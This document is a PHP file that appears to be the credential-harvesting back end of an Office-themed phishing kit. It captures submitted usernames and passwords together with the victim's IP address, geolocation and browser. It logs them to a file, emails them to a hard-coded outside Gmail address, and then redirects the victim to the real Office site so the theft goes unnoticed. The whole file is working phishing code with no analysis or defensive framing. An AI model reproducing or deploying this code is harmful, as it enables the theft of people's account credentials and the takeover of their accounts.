<?php 
$browser = $_SERVER['HTTP_USER_AGENT'];

require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$message .= "-Office-\n";
$message .= "Email: " . $_POST['UserName'] . "\n"; 
$message .= "Password: " . $_POST['Password'] . "\n"; 
$message .= "IP : " .$ip. "\n";
$message .= "--------------------------------------------\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "---------------------------------------------\n";
$to = "jingleicompressorr@gmail.com"; 
$file = fopen("offphp.txt", "a");
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
fputs ($file, "$message\r\n");
fputs ($file, "--------\r\n");
fclose ($file);

$hi = mail($to,$emailprovider."Office | ".$ip , $message);
	?> 
<script type="text/javascript"> 
<!-- 
   window.location="http://www.office.com/"

</script> 
<?php	

  ?> 
<script type="text/javascript">

</script> 
<?php	
fclose($handle); 
exit; 
?> 